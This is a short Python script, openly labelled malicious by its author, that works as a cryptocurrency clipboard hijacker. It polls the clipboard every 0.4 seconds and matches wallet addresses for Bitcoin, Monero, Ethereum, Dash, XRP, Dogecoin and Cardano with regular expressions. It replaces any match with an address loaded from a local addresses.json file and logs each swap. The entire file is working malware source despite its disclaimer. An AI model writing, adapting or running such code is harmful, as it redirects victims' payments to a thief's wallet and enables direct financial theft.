# Warning! This code is malicious, I take 0 responsibility for misuse.
# Created By github.com/jacques-andre
# Function Definitions:
# sniff -  go through regex_matches and find if clipboard contains any crypto if so: return what crypto
# replace - load in crypto addresses from json file and replace clipboard

import pyperclip
import json
import time
import re
import argparse
from datetime import datetime

# DEV
import pprint

parser = argparse.ArgumentParser(
    description="Replace crypto-addresses in clipboard with your own"
)
parser.add_argument("--log", help="log output to log.json", action="store_true")

def main():
    while 1:
        now = datetime.now()
        current_time = now.strftime("%d/%m/%Y %H:%M:%S")

        time.sleep(0.4)

        user_clipboard = pyperclip.paste()
        crypto_found = sniff(user_clipboard)
        replacement_address = replace(user_clipboard,crypto_found)

        log(now,crypto_found,user_clipboard,replacement_address)


def replace(user_clipboard,  crypto_found):
    with open('addresses.json') as json_file: 
        master_addresses = json.load(json_file)

    if crypto_found != 0:
            pyperclip.copy(master_addresses[crypto_found])
            return str(master_addresses[crypto_found])
    return 0
       

def sniff(user_clipboard):
    crypto_regex_match = {
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "dodge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$"
    }

    for k, v in crypto_regex_match.items():
        if bool(re.search(v, user_clipboard)):
            return str(k)

    return 0

def log(current_time,crypto_found,user_clipboard,replacement_address):
    if crypto_found != 0:
        with open("log.txt", "a+") as log:
            log.write("[" + str(current_time) + "]: " + str(crypto_found.upper()) +  " in clipboard " + "(" + str(user_clipboard) + ") " + "replacing with -> "+ str(replacement_address) + "\n")


main()
